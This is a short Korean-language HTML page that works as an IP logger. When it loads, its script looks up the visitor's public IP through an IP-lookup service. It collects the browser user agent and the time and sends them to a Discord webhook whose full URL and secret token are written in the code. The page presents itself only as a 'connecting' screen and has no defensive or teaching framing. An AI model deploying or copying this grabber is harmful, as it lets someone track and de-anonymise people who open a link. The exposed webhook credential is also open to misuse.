<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>접속 중...</title>
  <style>
    body{margin:0;height:100vh;display:flex;justify-content:center;align-items:center;background:#111;color:#0f0;font-family:monospace}
    .msg{font-size:1.4em;max-width:90%;padding:20px;border:1px solid #0f0;border-radius:8px;text-align:center}
  </style>
</head>
<body>
<div class="msg">접속 정보를 기록 중입니다...</div>

<script>
(async()=>{
  const status = document.querySelector('.msg');
  try{
    const r = await fetch('https://api.ipify.org?format=json');
    const {ip} = await r.json();
    const ua = navigator.userAgent.substring(0,150) || '알 수 없음';
    const time = new Date().toISOString();

    const msg = `새 접속\n\nIP: \`${ip}\`\n기기: ${ua}\n시간: ${time}`;

    await fetch("https://discord.com/api/webhooks/1461935652399611958/QZtsdKjYUeBrQ8x9BxKk0nuT09l1SnU8N68jp-FxD87LWglJ9D7jCfnKOgPz7L0p1dOd", {
      method: "POST",
      mode: "no-cors",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({content: msg})
    });

    status.innerHTML = "기록 완료 ✓";
    status.style.borderColor = '#0f0';
    status.style.color = '#0f0';
  }catch(e){
    console.log(e);
    status.innerHTML = "실패 ㅠㅠ";
    status.style.borderColor = '#f00';
    status.style.color = '#f00';
  }
})();
</script>
</body>
</html>
